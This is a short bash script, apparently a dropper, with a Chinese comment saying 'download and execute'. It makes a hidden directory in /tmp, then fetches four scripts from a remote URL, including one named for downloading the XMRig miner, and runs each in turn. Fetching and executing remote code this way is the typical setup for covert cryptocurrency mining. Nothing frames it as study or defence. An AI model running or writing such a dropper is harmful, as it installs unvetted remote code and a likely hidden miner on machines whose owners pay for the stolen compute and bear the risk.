#!/bin/bash
set -e

BASE="/tmp/.job"
URL="https://example.com/scripts"

mkdir -p "$BASE"
cd "$BASE"

# 下載並執行（固定順序）
for f in \
  01_prepare.sh \
  02_download_xmrig.sh \
  03_config.sh \
  04_run.sh
do
  echo "[+] wget $f"
  wget -q "$URL/$f" -O "$f"
  chmod +x "$f"
  echo "[>] run $f"
  bash "$f"
done

echo "[✓] bootstrap done"